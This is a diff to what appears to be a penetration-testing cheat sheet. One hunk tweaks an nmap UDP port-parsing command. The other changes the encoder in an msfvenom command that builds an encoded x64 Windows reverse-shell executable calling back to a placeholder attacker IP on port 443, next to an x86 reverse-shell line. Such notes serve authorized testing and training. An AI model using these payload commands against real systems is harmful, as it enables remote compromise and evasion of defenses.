@@ -60,7 +60,7 @@ ports=$(grep -oP '\d{1,5}(?=/open)' nmap-allports.gnmap | tr '\n' ',' | sed 's/,
 nmap -p$ports -sC -sV -oN nmap-targeted.txt <target>
 
 # Same pattern for UDP — version/script-scan just the UDP ports found open above
-udp_ports=$(grep -oP '\d{1,5}(?=/open/udp)' nmap-udp-top100.gnmap | tr '\n' ',' | sed 's/,$//')
+udp_ports=$(grep -oP '\d{1,5}(?=/open(\|filtered)?/udp)' nmap-udp-top100.gnmap | tr '\n' ',' | sed 's/,$//')
 sudo nmap -sU -p$udp_ports -sC -sV -oN nmap-udp-targeted.txt <target>
 ```
 
@@ -363,7 +363,7 @@ msfvenom -p windows/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
 
 # x64 payload requires an x64-compatible encoder (shikata_ga_nai is x86-only)
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 \
-  -e x64/xor_dynamic -i 5 -f exe -o shell_enc_x64.exe
+  -e x64/xor -i 5 -f exe -o shell_enc_x64.exe
 
 # Common -f formats: exe, elf, raw, war, asp, aspx, jsp, psh (powershell), dll, macho
 ```
